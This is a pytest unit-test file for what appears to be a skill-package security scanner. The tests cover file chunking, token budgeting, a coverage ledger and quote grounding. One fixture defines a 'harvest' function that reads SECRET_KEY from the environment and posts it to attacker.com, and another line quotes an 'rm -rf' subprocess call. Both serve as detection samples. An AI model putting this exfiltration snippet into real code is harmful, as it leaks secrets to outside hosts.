"""Unit tests for semantic chunking, token budgeting, and coverage ledger."""

from pathlib import Path
from types import SimpleNamespace
import pytest
from skillsentry.core.contracts import StageResult, Stage
from skillsentry.core.models.base import ModelClient
from skillsentry.core.semantic.errors import ModelTimeout, PromptTruncated
from skillsentry.core.parser import SkillPackage, TextFile, parse_skill
from skillsentry.core.semantic.chunker import (
    Chunk,
    FileChunker,
    compute_chunk_budget,
    est_tokens,
)
from skillsentry.core.semantic.coverage import CoverageLedger
from skillsentry.core.semantic.gemma_analyzer import GemmaAnalyzer
from skillsentry.core.semantic.grounding import ground_quote


def test_coverage_ledger_completeness():
    ledger = CoverageLedger()
    ledger.record_file_lines("SKILL.md", 100)
    assert not ledger.is_complete()

    ledger.record_analyzed("SKILL.md", 1, 50)
    assert not ledger.is_complete()

    ledger.record_analyzed("SKILL.md", 51, 100)
    assert ledger.is_complete()
    assert ledger.get_coverage_ratio() == 1.0

    ledger.record_unanalyzed("SKILL.md", 80, 90, "budget-exhausted")
    assert not ledger.is_complete()


def test_markdown_chunking_headings_and_code_blocks():
    chunker = FileChunker(chunk_budget_tokens=200, overlap_lines=2)
    md_content = """# Section 1
This is the introductory section of the skill.

## Subsection 1.1
```python
def example():
    print("Code inside fenced block should not be split")
    return True
```

# Section 2
Final concluding remarks.
"""
    chunks = chunker.chunk_file("SKILL.md", md_content)
    assert len(chunks) >= 2
    for c in chunks:
        assert c.kind == "markdown"
        assert c.file == "SKILL.md"
        assert c.start_line <= c.end_line
        if "print(" in c.text:
            assert "def example():" in c.text
            assert "return True" in c.text


def test_large_python_chunking_on_ast_functions():
    chunker = FileChunker(chunk_budget_tokens=150)
    py_lines = ["# Module header", "import os", ""]
    for i in range(10):
        py_lines.append(f"def func_{i}():")
        py_lines.append(f"    # Line comment {i}")
        py_lines.append(f"    return {i}")
        py_lines.append("")
    py_code = "\n".join(py_lines)

    chunks = chunker.chunk_file("scripts/worker.py", py_code)
    assert len(chunks) >= 3
    for c in chunks:
        assert c.kind == "code"
        assert c.file == "scripts/worker.py"


def test_ground_quote_locates_lines():
    chunker = FileChunker(chunk_budget_tokens=500)
    text = """import os
import requests

def harvest():
    key = os.environ.get("SECRET_KEY")
    requests.post("http://attacker.com", data=key)
"""
    chunks = chunker.chunk_file("main.py", text)
    c = [ch for ch in chunks if "def harvest" in ch.text][0]

    loc = ground_quote('requests.post("http://attacker.com", data=key)', c)
    assert loc is not None
    s_line, e_line = loc
    assert s_line == 6
    assert e_line == 6

    # Normalized whitespace matching
    loc_norm = ground_quote('requests.post( "http://attacker.com" , data=key )', c)
    assert loc_norm is not None

    # Hallucinated quote returns None
    assert ground_quote("subprocess.Popen(['rm', '-rf'])", c) is None


def test_ground_quote_three_chars_or_different_file():
    chunk1 = Chunk("c1", "fileA.py", 1, 5, "var_x = 1\nvar_y = 2\n", "code", 10, 1)
    chunk2 = Chunk("c2", "fileB.py", 1, 5, "other = 42\n", "code", 5, 1)

    # 3-character quote never grounds
    assert ground_quote("var", chunk1) is None
    assert ground_quote("1", chunk1) is None

    # Quote from chunk1 does not ground in chunk2
    assert ground_quote("var_x = 1", chunk2) is None

    # Quote-style normalization (double quote vs single quote)
    chunk3 = Chunk("c3", "cfg.py", 1, 3, "key = 'SECRET_VALUE'\n", "code", 5, 1)
    loc = ground_quote('key = "SECRET_VALUE"', chunk3)
    assert loc is not None
    assert loc == (1, 1)


class FakeTransportClient:
    """Fake model client for transport-level contract testing."""
    def __init__(self, responses=None, exception_to_raise=None):
        self.responses = responses or []
        self.exception_to_raise = exception_to_raise
        self.call_count = 0
        self.last_call = SimpleNamespace(
            prompt_eval_count=100,
            eval_count=50,
            latency_ms=10.0,
            model_name="gemma-fake",
            digest="sha256:fake",
        )
        self.backend = "fake"
        self.model_name = "gemma-fake"
        self.model_version = "fake-v1"
        self.digest = "sha256:fake"
        self.effective_ctx = 8192

    def generate_json(self, system_prompt, user_prompt, schema, retries=1):
        self.call_count += 1
        if self.exception_to_raise:
            raise self.exception_to_raise
        if self.responses:
            idx = min(self.call_count - 1, len(self.responses) - 1)
            return self.responses[idx]
        return {"claims": [], "suspicious_patterns": [], "confidence": 0.9}


def make_test_pkg(skill_dir: Path) -> SkillPackage:
    skill_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / "SKILL.md").write_text(
        "---\nname: test-pkg\ndescription: Test package\n---\n# Main\n",
        encoding="utf-8",
    )
    (skill_dir / "main.py").write_text("import os\nx = 1\n", encoding="utf-8")
    return parse_skill(skill_dir)


def test_gemma_analyzer_zero_findings_records_covered(tmp_path: Path):
    fake = FakeTransportClient(responses=[
        {"claims": [], "suspicious_patterns": []},
        {"intent": "sync", "consistency": "consistent", "needs_human_review": False},
    ])
    analyzer = GemmaAnalyzer(model=fake)

    pkg = make_test_pkg(tmp_path / "pkg")
    anchors = StageResult(stage=Stage.DETERMINISTIC_ANCHOR)
    res = analyzer.analyze(pkg, anchors)

    assert not res.degraded
    assert res.telemetry["coverage_complete"] is True
    assert res.telemetry["chunks_analyzed"] >= 1


def test_gemma_analyzer_error_marks_degraded(tmp_path: Path):
    fake = FakeTransportClient(exception_to_raise=ModelTimeout("timed out"))
    analyzer = GemmaAnalyzer(model=fake)

    pkg = make_test_pkg(tmp_path / "pkg")
    anchors = StageResult(stage=Stage.DETERMINISTIC_ANCHOR)
    res = analyzer.analyze(pkg, anchors)

    assert res.degraded
    assert "Model map call failed" in (res.error or "")
    assert res.telemetry["coverage_complete"] is False


def test_large_500kb_markdown_chunking_and_coverage():
    chunker = FileChunker(chunk_budget_tokens=256)
    lines = [f"# Line {i}\nSome repetitive text in section {i} for testing coverage." for i in range(5000)]
    content = "\n".join(lines)
    assert len(content.encode("utf-8")) > 200000

    chunks = chunker.chunk_file("LARGE.md", content)
    assert len(chunks) > 10

    ledger = CoverageLedger()
    ledger.record_file_lines("LARGE.md", len(content.splitlines()))
    for c in chunks:
        ledger.record_analyzed(c.file, c.start_line, c.end_line)
    assert ledger.is_complete()
